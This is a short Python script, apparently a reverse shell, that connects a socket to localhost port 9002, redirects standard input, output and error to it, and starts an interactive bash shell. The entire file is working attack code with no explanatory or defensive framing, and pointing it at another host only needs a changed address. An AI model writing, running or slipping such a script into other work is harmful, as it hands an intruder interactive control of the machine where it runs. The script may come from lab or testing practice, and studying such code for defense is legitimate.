from socket import socket, AF_INET, SOCK_STREAM
from subprocess import call
from os import dup2

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 9002))

dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)

call(["/bin/bash", "-i"])
